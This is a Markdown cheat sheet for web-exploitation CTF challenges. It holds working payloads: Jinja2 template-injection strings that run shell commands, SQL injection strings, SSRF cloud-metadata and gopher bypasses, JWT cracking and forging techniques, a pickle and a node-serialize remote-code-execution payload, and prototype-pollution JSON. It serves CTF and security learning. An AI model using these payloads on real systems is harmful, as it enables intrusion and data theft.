# Web Exploitation CTF Reference Guide

A structured methodology for auditing, debugging, and solving web challenges in CTFs.

---

## 1. Initial Triage Checklist

- [ ] **Inspect Source Code / Git Repo**: Look for `.git/`, backup files (`.bak`, `~`, `.swp`), environment variables (`.env`), hardcoded secrets.
- [ ] **HTTP Headers & Cookies**: Check `Set-Cookie` flags (`HttpOnly`, `SameSite`), custom headers, JWT tokens, Flask session cookies.
- [ ] **Technology Fingerprint**: Identify framework (Flask, Django, Express, PHP, Spring Boot, FastAPI, Go Gin, Ruby on Rails).
- [ ] **Input Points**: Query parameters, POST JSON bodies, file uploads, WebSocket messages, custom headers (`X-Forwarded-For`, `User-Agent`).

---

## 2. Vulnerability Categories & Quick Checks

### 1. Server-Side Template Injection (SSTI)

#### Identification Matrix
Submit `${{7*7}}` or `{{7*7}}` or `<%= 7*7 %>`:
```
                ${{7*7}} -> 49?
                 /        \
              Yes          No
             /              \
         Smarty / Mako     {{7*7}} -> 49?
                          /            \
                        Yes             No
                       /                 \
            {{7*'7'}} -> 7777777?     <%= 7*7 %> -> 49? (ERB)
            /                 \
         Jinja2 / Twig       Twig / Pebble
```

#### Jinja2 (Python / Flask) Exploits
```jinja2
{# Subclasses traversal #}
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# Direct subprocess execution #}
{{ config.__class__.__init__.__globals__['os'].popen('cat flag* /flag').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}

{# Filter bypass (no quotes, no underscores) #}
{{ request.args.cmd }} &cmd=cat /flag
{{ (lipsum|attr(request.args.g)|attr(request.args.i))(request.args.c).read() }}&g=__globals__&i=os&c=cat%20flag
```

---

### 2. SQL Injection (SQLi)

#### Fast Diagnostic Payloads
```sql
' OR '1'='1' --
' UNION SELECT NULL, NULL, NULL --
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--
```

#### Database Specifics
| Engine | Version Extraction | Table Schema Extraction |
| :--- | :--- | :--- |
| **SQLite** | `sqlite_version()` | `SELECT sql FROM sqlite_master WHERE type='table'` |
| **MySQL / MariaDB** | `version()`, `@@version` | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| **PostgreSQL** | `version()` | `SELECT table_name FROM information_schema.tables WHERE table_schema='public'` |

---

### 3. Server-Side Request Forgery (SSRF)

- **Cloud Metadata Endpoints**:
  - AWS: `http://169.254.169.254/latest/meta-data/`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` (Requires Header `Metadata-Flavor: Google`)
  - DigitalOcean: `http://169.254.169.254/metadata/v1.json`
- **Bypass Filters**:
  - `http://127.0.0.1` -> `http://0x7f000001`, `http://2130706433`, `http://127.1`, `http://[::1]`
  - URL schemes: `file:///etc/passwd`, `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a`, `dict://127.0.0.1:11211/`

---

### 4. JWT (JSON Web Tokens) Attacks

- **`"alg": "none"`**: Modify header to `"alg": "none"`, remove signature part (keep trailing dot `header.payload.`).
- **Weak Secret Brute-Force**:
  ```bash
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
  ```
- **Key Confusion (RS256 -> HS256)**: Sign token using HMAC-SHA256 with the server's public RSA key as the HMAC shared secret.
- **Header Injection (`jwk`, `jku`, `kid`)**:
  - Path traversal in `kid`: `"kid": "../../../dev/null"` (signature verified against empty string `""`).
  - Self-hosted JWK set via `jku`.

---

### 5. Insecure Deserialization

- **Python `pickle`**:
  ```python
  import pickle, base64, os
  class Exploit:
      def __reduce__(self):
          return (os.system, ('cat flag* > /tmp/flag.txt',))
  print(base64.b64encode(pickle.dumps(Exploit())).decode())
  ```
- **Node.js `node-serialize`**:
  ```json
  {"rce": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('cat flag').toString(); }()}
  ```
- **PHP Object Injection**: Check for `unserialize()` with `__destruct()`, `__wakeup()`, or `__toString()` magic methods.

---

### 6. Prototype Pollution (JavaScript / Node.js)

- **Sources**: Merge, clone, path assignment utilities (`lodash.merge`, `deep-assign`).
- **Payloads**:
  ```json
  {"__proto__": {"admin": true}}
  {"constructor": {"prototype": {"isAdmin": true}}}
  ```
- **RCE Gadgets in Node.js**: Polluting `NODE_OPTIONS`, `shell`, `execPath`, or `env`.

---

## 3. Session & Token Utilities

```bash
# Flask Session Decode / Sign (using secret key)
python3 -c "from flask_unsign import session; print(session.decode('COOKIE_HERE'))"
flask-unsign --unsign --cookie "COOKIE_HERE" --wordlist /usr/share/wordlists/rockyou.txt
```
